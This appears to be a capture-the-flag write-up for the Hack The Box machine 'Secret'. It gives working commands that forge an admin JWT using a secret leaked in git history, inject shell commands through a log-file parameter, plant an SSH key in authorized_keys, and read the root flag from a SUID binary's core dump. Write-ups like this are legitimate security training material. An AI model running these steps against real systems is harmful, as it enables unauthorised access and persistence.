## Info

Secret is an easy level linux box hosted on HTB, which focuses on JWT exploitation and remote command injection.

IP: 10.10.11.120


# Fingerprinting

Let's start out with an nmap scan.

```
nmap -sC -sV $IP

Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-07 18:58 EST
Nmap scan report for secret.htb (10.10.11.120)
Host is up (0.19s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.10 seconds
```

Not too much out of the usual here, lets take a look at the website.

![img1-min](https://user-images.githubusercontent.com/72148770/160254513-ad728559-3d6f-405b-bade-759fe33c8b50.png)

Looks to be some sort of API that we have to interact with.

Let's scroll down to the bottom to download the source code, and start to follow the documentation.

In order to register a user, we must send a POST request to `http://$IP:3000/api/user/register`, along with some JSON data in order to create our account. I always like to stick to the format, so we'll keep our email domain as dasith.works
```curl -X POST -H 'Content-Type: application/json' -d '{"name":"userinky", "email":"inky@dasith.works", "password":"userinky"}' http://10.10.11.120/api/user/register
{"user":"userinky"}
```
The post request returns our username, so it seems to have gone through, we now have a valid account! Let's login!

```
curl -X POST -H 'Content-Type: application/json' -d '{"email":"inky@dasith.works", "password":"userinky"}' http://10.10.11.120:3000/api/user/login

IiwiaWF0IjoxNjQ2Njk4NDI1fQ.zh32hjab2xHlJd-WTDVuzksBneaenJpeJMLtFlExEME
```

Now we have a valid JWT token! Let's head over to https://jwt.io in order to take a look at what it does!

![img2](https://user-images.githubusercontent.com/72148770/160255022-59587e0a-2bd6-4a9c-92e4-821a03784140.png)


Let's try accessing the api/priv endpoint with our new token.

```
curl -H 'auth-token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI2OWVkZjE3YjcxZjA0NjE2YWNhMDMiLCJuYW1lIjoidXNlcmlua3kiLCJlbWFpbCI6Imlua3lAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2Njk4NDI1fQ.bow0nys_azNS3CtuqQvmwWWEGTuhpk8sMZHMsHy9heo' http://$IP:3000/api/priv

Access Denied
```

Doesn't seem to work. When in doubt, check the source code!

After doing a quick, easy scan of the source code, I couldn't find anything. Maybe something in a previous commit?

```
git diff HEAD~2

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```

Aha! The secret was removed in a previous version. Let's add that to the JWT decoder, (as well as changing my name to theadmin, you read the source code, right?) and make another request.

```
curl -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI2OWVkZjE3YjcxZjA0NjE2YWNhMDMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imlua3lAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2Njk4NDI1fQ.c-HkFLqjBX8Jypu-bGmFZNpUfTVXpggkWkAV75_febA' http://$IP:3000/api/priv/

{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}`
```

There we go! I was expecting to get the user flag here, but we're still not there, so lets take a look around. After re-examining, the source code for a while, I discovered a potential RCE with the file parameter under /api/logs.

## RCE

```
curl -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI2OWVkZjE3YjcxZjA0NjE2YWNhMDMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imlua3lAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2Njk4NDI1fQ.c-HkFLqjBX8Jypu-bGmFZNpUfTVXpggkWkAV75_febA' 'http://10.10.11.120/api/logs?file=index.js;id'
```

Looks like we're running under user dasith. We can leverage this RCE to add our own SSH keys to get a full shell on the machine. This is generally a formatting nightmare, as we need to make sure it's still in URL encoding. Starting out, we'll generate a new SSH keyset.

```
ssh-keygen -f secret.htb

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in secret.htb
Your public key has been saved in secret.htb.pub
The key fingerprint is:
SHA256:LJetZl7jSHNO5IcXnXpdkRxfVmYpcSNSl1YebH4PJAQ kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|          E+o+o*%|
|            o.*@B|
|             o=+o|
|       . o   ..oo|
|      . S o . o.+|
|       o + . o .o|
|        * B + . .|
|       = O + .   |
|        o o      |
+----[SHA256]-----+
````

Now, to make things easier, let's export our SSH key to a variable.

`export SSHKEY=$(cat secret.htb.pub)`

Once that's done, we can begin crafting our command.

```
curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjI2OWVkZjE3YjcxZjA0NjE2YWNhMDMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6Imlua3lAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ2Njk4NDI1fQ.c-HkFLqjBX8Jypu-bGmFZNpUfTVXpggkWkAV75_febA' --data-urlencode "file=index.js;echo $SSHKEY >> /home/dasith/.ssh/authorized_keys"'http://10.10.11.120/api/logs'
```

Doesn't seem to work. After a while, finally found the issue. Since we have data, curl normally reads this as a POST request. Make sure it's a GET request, and we can ssh on in with

`ssh -i secret.htb dasith@secret.htb`

And we're in! User flag acquired, time to look at privilege escalation vectors.

After doing some poking around in the root directory, I found the `count` binary running with suid privileges. Time for some light binary exploitation.

Run the binary with `./count` and we can see what's up. The flag is always in /root/root.txt. so lets have that read it out for us. Unfortunately, we only get an access denied message. Next step is to attempt a memory dump. Let's run count again, but this time, background it when it asks us to save the results, then kill it and see if it drops a core dump for us to look through.


```
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: ^Z
[2]+  Stopped                 ./count
dasith@secret:/opt$ ps
    PID TTY          TIME CMD
   3545 pts/3    00:00:00 bash
   3654 pts/3    00:00:00 count
   3657 pts/3    00:00:00 ps
dasith@secret:/opt$ kill -BUS 3654
dasith@secret:/opt$ fg
./count
Bus error (core dumped)
```

Crashes are usually saved in /var/crash, so let's go take a look!

Seems like we need to unpack the crash, I prefer apport, so let's unpack it and move it to a different directory.

`apport-unpack /var/crash/_opt_count.1000.crash /tmp/countcrash`

This is a binary file, so a dump would be pretty hard to read. Let's try `string`-ing CoreDump.

And there it is!

This works because it makes an insecure call, so we have the ability to view it in plaintext if we crash it before the program finishes.

We have our root flag, and have succesfully pwned Secret!
